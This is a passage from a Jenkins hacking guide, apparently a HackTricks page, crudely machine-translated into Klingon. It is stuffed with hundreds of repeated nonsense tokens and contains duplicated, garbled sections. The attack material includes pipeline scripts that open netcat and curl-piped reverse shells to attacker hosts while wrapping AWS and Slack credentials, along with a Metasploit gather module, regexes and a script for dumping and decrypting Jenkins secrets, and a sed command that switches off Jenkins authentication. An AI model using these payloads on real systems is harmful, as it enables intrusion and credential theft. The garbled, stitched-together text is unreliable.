**ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **
```bash
triggers { cron('H */4 * * 1-5') }
```
**QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ** **QaQ
```bash
pipeline {
agent {label 'built-in'}
```
### HoSghaj

Pipeline vItlhutlh vItlhutlh agent, cron trigger, pipeline je stage env variables, 2 variables vItlhutlh step je 'ej reverse shell bIqIj. 

```groovy
pipeline {
    agent any

    triggers {
        cron('H * * * *')
    }

    environment {
        PIPELINE_VAR = 'Hello'
        STAGE_VAR = 'World'
    }

    stages {
        stage('Example') {
            steps {
                script {
                    def var1 = env.PIPELINE_VAR
                    def var2 = env.STAGE_VAR

                    sh "echo $var1 $var2"
                    sh "nc -e /bin/sh <attacker_ip> <attacker_port>"
                }
            }
        }
    }
}
```

### tlhIngan Hol:

```groovy
pipeline {
    agent any

    triggers {
        cron('H * * * *')
    }

    environment {
        PIPELINE_VAR = 'nuqneH'
        STAGE_VAR = 'loD'
    }

    stages {
        stage('Example') {
            steps {
                script {
                    def var1 = env.PIPELINE_VAR
                    def var2 = env.STAGE_VAR

                    sh "echo $var1 $var2"
                    sh "nc -e /bin/sh <attacker_ip> <attacker_port>"
                }
            }
        }
    }
}
```
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit

Metasploit is a powerful framework for exploiting vulnerabilities and conducting post-exploitation activities. It provides a wide range of modules and payloads that can be used to gain unauthorized access, escalate privileges, and maintain persistence on compromised systems.

Metasploit is widely used by both ethical hackers and malicious actors due to its extensive collection of exploits and ease of use. It allows hackers to automate the process of identifying and exploiting vulnerabilities, making it an invaluable tool for penetration testing and red teaming exercises.

Some of the key features of Metasploit include:

- Exploit modules: These modules contain the actual exploits that can be used to compromise a target system. Metasploit provides a large number of exploit modules for various vulnerabilities and platforms.

- Payloads: Payloads are pieces of code that are executed on the target system after a successful exploit. Metasploit offers a wide range of payloads, including reverse shells, meterpreter sessions, and post-exploitation modules.

- Post-exploitation modules: These modules are used to perform various activities on a compromised system, such as gathering information, pivoting to other systems, and maintaining persistence.

- Meterpreter: Meterpreter is a powerful post-exploitation payload that provides an interactive shell on the target system. It allows hackers to execute commands, upload/download files, and perform various other actions on the compromised system.

Metasploit also provides a command-line interface (CLI) and a graphical user interface (GUI) called Armitage, which makes it easier to use for beginners. The framework supports multiple operating systems, including Windows, Linux, and macOS.

It is important to note that Metasploit should only be used for authorized penetration testing and ethical hacking purposes. Unauthorized use of Metasploit or any other hacking tool is illegal and can result in severe consequences. Always ensure that you have proper authorization and follow ethical guidelines when using Metasploit or any other hacking tool.
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

**QIj** `/credentials/` **ghItlh** **secrets** **nIvbogh**. **credentials.xml** **file** **nIvbogh** **secrets** **ghItlh** **list** **bIquv**. **build configuration files** **nIvbogh** **secrets** **more** **ghItlh** **bIquv**.

**project** **configuration** **nIvbogh** **can** **see** **secrets** **names** **repository** **access** **credentials (secrets)** **ghItlh** **other credentials** **project** **ghItlh** **bIquv**.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Groovy nIvbogh

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Disk nIvbogh

**Jenkins secrets** **decrypt** **bIquv** **files** **ghItlh**:

* secrets/master.key
* secrets/hudson.util.Secret

**secrets** **usually** **found** **bIquv**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

**regex** **bIquv**:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

If you have dumped the **needed passwords to decrypt the secrets**, use [**this script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **to decrypt those secrets**.

#### jenqoq Jenkins secrets offline

vaj jImej **needed passwords to decrypt the secrets** vItlhutlh [**this script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **to decrypt those secrets**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Decrypt Jenkins secrets from Groovy

##### tlhIngan Hol Translation:

#### Groovy vItlhutlh Jenkins secrets

##### HTML Translation:

<h4>Decrypt Jenkins secrets from Groovy</h4>

<h5>tlhIngan Hol Translation:</h5>

<h4>Groovy vItlhutlh Jenkins secrets</h4>
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Create new admin user

1. Access the Jenkins config.xml file in `/var/lib/jenkins/config.xml` or `C:\Program Files (x86)\Jenkis\`
2. Search for the word `<useSecurity>true</useSecurity>`and change the word \*\*`true` \*\* to **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Restart** the **Jenkins** server: `service jenkins restart`
4. Now go to the Jenkins portal again and **Jenkins will not ask any credentials** this time. You navigate to "**Manage Jenkins**" to set the **administrator password again**.
5. **Enable** the **security** again by changing settings to `<useSecurity>true</useSecurity>` and **restart the Jenkins again**.

## References

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
